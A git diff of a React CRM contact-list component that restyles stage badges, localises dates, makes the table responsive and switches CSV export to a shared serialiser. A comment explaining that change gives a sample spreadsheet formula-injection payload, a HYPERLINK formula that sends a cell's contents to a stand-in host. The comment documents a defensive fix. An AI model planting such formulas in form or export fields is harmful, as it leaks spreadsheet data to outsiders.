@@ -1,9 +1,9 @@
 'use client';
 
 import { useState, useEffect } from 'react';
-import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
 import { ContactsPager } from '@/components/crm/ContactsPager';
+import { toCsvFile } from '@/lib/payments/csv';
 import { Input } from '@/components/ui/input';
 import { Download, Trash2, Tag, X, Check, ChevronLeft, ChevronRight, ArrowUpDown, ArrowUp, ArrowDown } from 'lucide-react';
 import { useLanguage } from '@/lib/business-os/LanguageContext';
@@ -22,11 +22,6 @@ interface CRMContactListProps {
   onPageChange?: (page: number) => void;
 }
 
-const STAGE_COLORS: Record<string, string> = {
-  lead: 'bg-blue-500/20 text-blue-600 dark:text-blue-400',
-  client: 'bg-green-500/20 text-green-600 dark:text-green-400',
-  past_client: 'bg-slate-500/20 text-slate-600 dark:text-slate-400'
-};
 
 export function CRMContactList({
   contacts,
@@ -46,6 +41,26 @@ export function CRMContactList({
    * business's own language — so a Hebrew pipeline stayed Hebrew in the English
    * list while the board beside it read English.
    */
+  /**
+   * Two letters to aim at.
+   *
+   * The first letter of each of the first two words, which works in both
+   * scripts without a special case: "שלמה המלך" and "Eyal Omer" both give two.
+   * Falls back to the email's first character, then to a dash, because a
+   * contact with neither a name nor an address still has to occupy a row.
+   */
+  const initialsOf = (contact: CRMContact): string => {
+    const name = `${contact.first_name ?? ''} ${contact.last_name ?? ''}`.trim();
+    if (name) {
+      return name
+        .split(/\s+/)
+        .slice(0, 2)
+        .map(word => [...word][0] ?? '')
+        .join('');
+    }
+    return [...(contact.email ?? '-')][0] ?? '-';
+  };
+
   const getStageLabel = (stageKey: string | undefined): string => {
     if (!stageKey) return '-';
     const stage = stages.find(s => s.stage_key === stageKey);
@@ -58,21 +73,50 @@ export function CRMContactList({
     );
   };
 
-  // Get stage color from stages array, fall back to default colors
-  const getStageColor = (stageKey: string | undefined): string => {
-    if (!stageKey) return 'bg-slate-500/20 text-slate-600 dark:text-slate-400';
-    const stage = stages.find(s => s.stage_key === stageKey);
-    if (stage?.color) {
-      // Convert hex color to tailwind-like classes
-      return `bg-[${stage.color}]/20 text-[${stage.color}]`;
+  /**
+   * The badge's own colour, as an inline style.
+   *
+   * ───────────────────────────────────────────────────────────────────────────
+   * THE OWNER'S PIPELINE COLOUR HAS NEVER REACHED THE SCREEN.
+   *
+   * This returned a Tailwind class built at runtime:
+   *
+   *     `bg-[${stage.color}]/20 text-[${stage.color}]`
+   *
+   * Tailwind generates arbitrary values by SCANNING THE SOURCE at build time.
+   * A class assembled from a database string exists in no stylesheet, so the
+   * badge got a class name with nothing behind it and fell back to the plain
+   * surface — identical for every stage. Every custom colour an owner picked
+   * was discarded silently, which is why the badges never matched the pipeline.
+   *
+   * There is no class-based fix: the colours are per-user data. An inline style
+   * is the only thing that can carry a value chosen at runtime.
+   *
+   * The tint is the same hue at 18% against the row, with the full colour as
+   * the text, which is what the original intended and never achieved.
+   * ───────────────────────────────────────────────────────────────────────────
+   */
+  const stageTone = (stageKey: string | undefined): { background: string; color: string } => {
+    const stage = stageKey ? stages.find(s => s.stage_key === stageKey) : undefined;
+
+    /* `#rrggbb` plus two hex digits of alpha, which every browser in scope
+       accepts. Guarded on the shape so a malformed value cannot emit a style
+       that paints the badge invisible. */
+    if (stage?.color && /^#[0-9a-f]{6}$/i.test(stage.color)) {
+      return { background: `${stage.color}2E`, color: stage.color };
     }
-    // Fall back to default stage colors based on stage_type
-    if (stage?.stage_type === 'lead') return 'bg-blue-500/20 text-blue-600 dark:text-blue-400';
-    if (stage?.stage_type === 'prospect') return 'bg-yellow-500/20 text-yellow-600 dark:text-yellow-400';
-    if (stage?.stage_type === 'client') return 'bg-green-500/20 text-green-600 dark:text-green-400';
-    if (stage?.stage_type === 'past_client') return 'bg-slate-500/20 text-slate-600 dark:text-slate-400';
-    // Fall back to STAGE_COLORS for legacy compatibility
-    return STAGE_COLORS[stageKey] || 'bg-slate-500/20 text-slate-600 dark:text-slate-400';
+
+    /* No colour stored. The type still carries meaning, so it keeps the
+       defaults the pipeline itself uses rather than going grey. */
+    const byType: Record<string, string> = {
+      lead: '#94a3b8',
+      prospect: '#f59e0b',
+      client: '#10b981',
+      past_client: '#6b7280',
+    };
+    const fallback = byType[stage?.stage_type ?? ''] ?? '#94a3b8';
+
+    return { background: `${fallback}2E`, color: fallback };
   };
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
   const [showTagInput, setShowTagInput] = useState(false);
@@ -135,7 +179,32 @@ export function CRMContactList({
     if (seconds < 3600) return `${Math.floor(seconds / 60)} ${t('crm.table.min_ago')}`;
     if (seconds < 86400) return `${Math.floor(seconds / 3600)} ${t('crm.table.hours_ago')}`;
     if (seconds < 604800) return `${Math.floor(seconds / 86400)} ${t('crm.table.days_ago')}`;
-    return new Date(date).toLocaleDateString();
+
+    /*
+     * A SHORT DATE, IN THE READER'S LANGUAGE.
+     *
+     * ─────────────────────────────────────────────────────────────────────────
+     * This was a bare `toLocaleDateString()`, which takes the BROWSER's locale
+     * rather than the one the page is being read in, and renders
+     * `06/10/2026` — eight heavy digits whose day and month cannot be told
+     * apart, sitting in a column whose other rows say "19 שעות".
+     *
+     * `6 באוק׳` is the form every other date in the product uses, and it reads
+     * as the same kind of fact as the relative ones above it.
+     *
+     * The year appears only when it is not this one. Printing it on every row
+     * costs four characters to tell the reader something they already know, and
+     * the column is the narrowest on the table.
+     * ─────────────────────────────────────────────────────────────────────────
+     */
+    const when = new Date(date);
+    const locale = language === 'he' ? 'he-IL' : language === 'es' ? 'es-ES' : 'en-US';
+
+    return when.toLocaleDateString(locale, {
+      day: 'numeric',
+      month: 'short',
+      ...(when.getFullYear() === new Date().getFullYear() ? {} : { year: 'numeric' }),
+    });
   };
 
   const toggleSelect = (id: string, e: React.MouseEvent) => {
@@ -182,15 +251,33 @@ export function CRMContactList({
       contact.stage || '',
       contact.source || '',
       (contact.tags || []).join('; '),
-      contact.created_at ? new Date(contact.created_at).toLocaleDateString() : ''
+      /* ISO, not `toLocaleDateString()`. That took the BROWSER's locale and
+         wrote `06/10/2026`, whose day and month cannot be told apart by the
+         person opening the file or by the spreadsheet importing it.
+         `2026-10-06` is unambiguous and sorts as text. */
+      contact.created_at ? new Date(contact.created_at).toISOString().slice(0, 10) : ''
     ]);
 
-    const csvContent = [
-      headers.join(','),
-      ...rows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(','))
-    ].join('\n');
-
-    const blob = new Blob(['\ufeff' + csvContent], { type: 'text/csv;charset=utf-8;' });
+    /*
+     * `toCsvFile`, not a hand-rolled quote.
+     *
+     * ─────────────────────────────────────────────────────────────────────────
+     * This built its rows as `"${String(cell).replace(/"/g, '""')}"`, which is
+     * correct CSV and no defence at all: a spreadsheet evaluates a cell whose
+     * value begins `=`, `+`, `-` or `@` after the quotes are parsed away.
+     *
+     * And this export is the worst place for it. `first_name`, `last_name`,
+     * `email` and `phone` are written by `POST /api/website/forms/contact`,
+     * which takes NO authentication — it is the public contact form on the
+     * business's own site. A stranger whose first name is
+     * `=HYPERLINK("https://example.invalid/?x="&A1,"Invoice")` gets that
+     * formula into the owner's spreadsheet, and the owner clicked "Export".
+     *
+     * The serialiser also keeps the BOM, which is what makes Excel read the
+     * Hebrew names as Hebrew.
+     * ─────────────────────────────────────────────────────────────────────────
+     */
+    const blob = new Blob([toCsvFile([headers, ...rows])], { type: 'text/csv;charset=utf-8;' });
     const link = document.createElement('a');
     link.href = URL.createObjectURL(blob);
     link.download = `contacts_selected_${new Date().toISOString().split('T')[0]}.csv`;
@@ -277,7 +364,7 @@ export function CRMContactList({
           <table className="w-full" style={{ fontFamily: 'var(--font-sans, "Heebo", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif)' }}>
             <thead className="bg-[var(--v2-bg)] border-b border-[var(--v2-border)]">
               <tr>
-                <th className="px-4 py-3 text-start">
+                <th className="px-2 py-2.5 text-start sm:px-4">
                   <input
                     type="checkbox"
                     checked={contacts.length > 0 && selectedIds.size === contacts.length}
@@ -286,7 +373,7 @@ export function CRMContactList({
                   />
                 </th>
                 <th
-                  className="px-4 py-3 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer hover:text-[var(--v2-text-primary)] transition-colors"
+                  className="whitespace-nowrap px-2 py-2.5 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer transition-colors hover:text-[var(--v2-text-primary)] sm:px-4"
                   onClick={() => handleSort('name')}
                 >
                   <div className="flex items-center gap-1">
@@ -295,16 +382,7 @@ export function CRMContactList({
                   </div>
                 </th>
                 <th
-                  className="px-4 py-3 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer hover:text-[var(--v2-text-primary)] transition-colors"
-                  onClick={() => handleSort('email')}
-                >
-                  <div className="flex items-center gap-1">
-                    {t('crm.table.email')}
-                    <SortIcon column="email" />
-                  </div>
-                </th>
-                <th
-                  className="px-4 py-3 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer hover:text-[var(--v2-text-primary)] transition-colors"
+                  className="hidden whitespace-nowrap px-4 py-2.5 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer transition-colors hover:text-[var(--v2-text-primary)] sm:table-cell"
                   onClick={() => handleSort('phone')}
                 >
                   <div className="flex items-center gap-1">
@@ -313,7 +391,7 @@ export function CRMContactList({
                   </div>
                 </th>
                 <th
-                  className="px-4 py-3 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer hover:text-[var(--v2-text-primary)] transition-colors"
+                  className="whitespace-nowrap px-2 py-2.5 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer transition-colors hover:text-[var(--v2-text-primary)] sm:px-4"
                   onClick={() => handleSort('stage')}
                 >
                   <div className="flex items-center gap-1">
@@ -321,14 +399,25 @@ export function CRMContactList({
                     <SortIcon column="stage" />
                   </div>
                 </th>
-                <th className="px-4 py-3 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider">
+                {/*
+                  Tags keep their column, but not their dashes.
+                  ──────────────────────────────────────────────
+                  It previously rendered "-" on every row for an account with no
+                  tags at all, spending a seventh of the width to say nothing.
+                  An empty cell says the same thing and says it quietly.
+
+                  Hidden below `md`: on a phone it is the first thing worth
+                  dropping, since a tag is a filter you apply rather than a fact
+                  you scan for.
+                */}
+                <th className="hidden whitespace-nowrap px-2 py-2.5 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider md:table-cell md:px-4">
                   {t('crm.table.tags')}
                 </th>
                 <th
-                  className="px-4 py-3 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer hover:text-[var(--v2-text-primary)] transition-colors"
+                  className="whitespace-nowrap px-2 py-2.5 text-end text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer transition-colors hover:text-[var(--v2-text-primary)] sm:px-4"
                   onClick={() => handleSort('updated_at')}
                 >
-                  <div className="flex items-center gap-1">
+                  <div className="flex items-center justify-end gap-1">
                     {t('crm.table.last_contact')}
                     <SortIcon column="updated_at" />
                   </div>
@@ -344,7 +433,7 @@ export function CRMContactList({
                     selectedIds.has(contact.id) ? 'bg-[#8B5CF6]/5' : ''
                   }`}
                 >
-                  <td className="px-4 py-4" onClick={(e) => toggleSelect(contact.id, e)}>
+                  <td className="px-2 py-2 sm:px-4" onClick={(e) => toggleSelect(contact.id, e)}>
                     <input
                       type="checkbox"
                       checked={selectedIds.has(contact.id)}
@@ -352,48 +441,124 @@ export function CRMContactList({
                       className="rounded border-[var(--v2-border)] text-[#8B5CF6] focus:ring-[#8B5CF6]"
                     />
                   </td>
-                  <td className="px-4 py-4 whitespace-nowrap">
-                    <span className="text-sm font-medium text-[var(--v2-text-primary)]">
-                      {contact.first_name} {contact.last_name}
-                    </span>
+
+                  {/*
+                    WHO, as one cell.
+                    ─────────────────
+                    The name and the email were two columns of equal weight, and
+                    nobody scans a list of email addresses: they look for a
+                    person and read the address once they have found them. One
+                    cell, the name leading and the address beneath it, gives the
+                    eye a single thing to track down the column.
+
+                    The initials are a target to aim at. In a list of Hebrew
+                    names at one size and one weight there was nothing to fix on.
+                  */}
+                  {/*
+                    `max-w-0` is what makes the truncation work.
+
+                    A table cell sizes to its content, so `min-w-0` and
+                    `truncate` inside it do nothing on their own: the cell simply
+                    grows and pushes the stage and the date off the screen. Zero
+                    maximum width lets it absorb whatever the nowrap columns
+                    leave, and the long email ellipsises instead of widening the
+                    table.
+                  */}
+                  <td className="w-full max-w-0 px-2 py-2 sm:px-4">
+                    <div className="flex min-w-0 items-center gap-2.5">
+                      <span
+                        aria-hidden
+                        className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full text-[11px] font-bold"
+                        style={stageTone(contact.stage)}
+                      >
+                        {initialsOf(contact)}
+                      </span>
+                      <div className="min-w-0">
+                        <div className="truncate text-sm font-semibold text-[var(--v2-text-primary)]">
+                          {contact.first_name} {contact.last_name}
+                        </div>
+                        {/*
+                          One secondary line, whatever the width. On a phone it
+                          carries the number too, because the column holding it
+                          is hidden there and a contact row without a way to
+                          reach the person is just a name.
+                        */}
+                        {(contact.email || contact.phone) && (
+                          <div className="truncate text-xs text-[var(--v2-text-muted)]">
+                            {contact.phone && (
+                              <span className="sm:hidden">
+                                <bdi className="tabular-nums">{contact.phone}</bdi>
+                                {contact.email ? ' · ' : ''}
+                              </span>
+                            )}
+                            {contact.email}
+                          </div>
+                        )}
+                      </div>
+                    </div>
                   </td>
-                  <td className="px-4 py-4 whitespace-nowrap">
-                    <span className="text-sm text-[var(--v2-text-primary)]">
-                      {contact.email || '-'}
-                    </span>
+
+                  {/*
+                    THE NUMBER, PROTECTED.
+                    ──────────────────────
+                    `+1 201 364 3030` was rendering as `12013643030+` for every
+                    Hebrew reader. The raw string sits in a right-to-left row,
+                    the bidi algorithm reads the leading `+` as a neutral and
+                    reorders it to the other end. `<bdi>` isolates the run so it
+                    keeps its own direction.
+
+                    Tabular figures so the digits line up down the column, which
+                    is the only reason to put numbers in a column at all.
+                  */}
+                  {/*
+                    Its own column on a laptop, folded into the line above on a
+                    phone. A five-column table on a 390px screen scrolls
+                    sideways, and a horizontally scrolling list is one people
+                    stop scrolling: the columns past the fold may as well not
+                    exist.
+                  */}
+                  <td className="hidden px-2 py-2 whitespace-nowrap sm:table-cell sm:px-4">
+                    {contact.phone ? (
+                      <bdi className="text-[13px] tabular-nums text-[var(--v2-text-secondary)]">
+                        {contact.phone}
+                      </bdi>
+                    ) : (
+                      <span className="text-[var(--v2-text-muted)]">&nbsp;</span>
+                    )}
                   </td>
-                  <td className="px-4 py-4 whitespace-nowrap">
-                    <span className="text-sm text-[var(--v2-text-primary)]">
-                      {contact.phone || '-'}
-                    </span>
+
+                  <td className="px-2 py-2 sm:px-4">
+                    <div className="flex flex-wrap items-center gap-1">
+                      <span
+                        className="inline-flex items-center rounded-full px-2 py-0.5 text-xs font-semibold whitespace-nowrap"
+                        style={stageTone(contact.stage)}
+                      >
+                        {getStageLabel(contact.stage)}
+                      </span>
+
+                    </div>
                   </td>
-                  <td className="px-4 py-4 whitespace-nowrap">
-                    <Badge className={`text-sm ${getStageColor(contact.stage)}`}>
-                      {getStageLabel(contact.stage)}
-                    </Badge>
-                  </td>
-                  <td className="px-4 py-4">
-                    <div className="flex flex-wrap gap-1">
-                      {contact.tags && contact.tags.length > 0 ? (
-                        <>
-                          {contact.tags.slice(0, 2).map(tag => (
-                            <Badge key={tag} variant="outline" className="text-sm">
-                              {tag}
-                            </Badge>
-                          ))}
-                          {contact.tags.length > 2 && (
-                            <Badge variant="outline" className="text-sm">
-                              +{contact.tags.length - 2}
-                            </Badge>
-                          )}
-                        </>
-                      ) : (
-                        <span className="text-sm text-[var(--v2-text-muted)]">-</span>
+
+                  <td className="hidden px-2 py-2 md:table-cell md:px-4">
+                    <div className="flex flex-wrap items-center gap-1">
+                      {contact.tags?.slice(0, 2).map(tag => (
+                        <span
+                          key={tag}
+                          className="inline-flex items-center whitespace-nowrap rounded-full border border-[var(--v2-border)] px-1.5 py-0.5 text-[11px] text-[var(--v2-text-secondary)]"
+                        >
+                          {tag}
+                        </span>
+                      ))}
+                      {(contact.tags?.length ?? 0) > 2 && (
+                        <span className="text-[11px] text-[var(--v2-text-muted)]">
+                          +{(contact.tags?.length ?? 0) - 2}
+                        </span>
                       )}
                     </div>
                   </td>
-                  <td className="px-4 py-4 whitespace-nowrap">
-                    <span className="text-sm text-[var(--v2-text-primary)]">
+
+                  <td className="px-2 py-2 text-end whitespace-nowrap sm:px-4">
+                    <span className="text-xs text-[var(--v2-text-muted)]">
                       {formatTimeAgo(contact.updated_at)}
                     </span>
                   </td>
